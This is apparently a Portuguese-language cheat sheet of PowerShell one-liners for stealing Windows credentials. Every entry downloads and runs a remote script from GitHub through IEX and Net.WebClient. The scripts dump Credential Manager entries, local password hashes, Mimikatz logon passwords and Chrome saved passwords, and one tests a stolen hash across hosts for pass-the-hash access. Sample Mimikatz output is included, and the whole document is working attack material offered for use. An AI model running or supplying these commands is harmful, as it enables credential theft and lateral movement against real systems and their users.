
# WCMDump
# Enumerar credenciais do Windows locais
-> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1'); Invoke-WCMDump

# Get-PassHashes
# Este script extrai hashs das senhas locais utilizando uma modificação do script powerdump do framework Metasploit. Requer acesso administrativo mas não exige privilégios SYSTEM.
-> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1'); Get-PassHashes

# Mimikatz
# Este onliner baixa executa o mimikatz, extraindo hashs e das senhas dos usuários locais e exportando a saída pra um arquivo de log txt.
powershell -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'log privilege::debug sekurlsa::logonpasswords exit'"
mimikatz(powershell) # log
Using 'mimikatz.log' for logfile : OK

mimikatz(powershell) # privilege::debug
Privilege '20' OK

mimikatz(powershell) # sekurlsa::logonpasswords
*LISTA AS INFOS DE USUARIOS E SENHAS

# Chrome-Password-Dumper
# Exporta as senhas salvas no Google Chrome sob privilégios do usuário atual.
-> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/roflsandwich/Chrome-Password-Dumper/master/chromev2.ps1')

# Check-LocalAdminHash
# Este script tenta se autenticar em vários hosts por WMI ou SMB usando um hash da senha para determinar se a credencial fornecida é um administrador local. É útil se você obtiver um hash de senha para um usuário e quiser ver onde ele é o administrador local dentro de uma rede.
-> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/Check-LocalAdminHash/master/Check-LocalAdminHash.ps1'); Check-LocalAdminHash -Domain testdomain.local -UserDomain testdomain.local -Username PossibleAdminUser -PasswordHash E62830DAED8DBEA4ACD0B99D682946BB -AllSystems

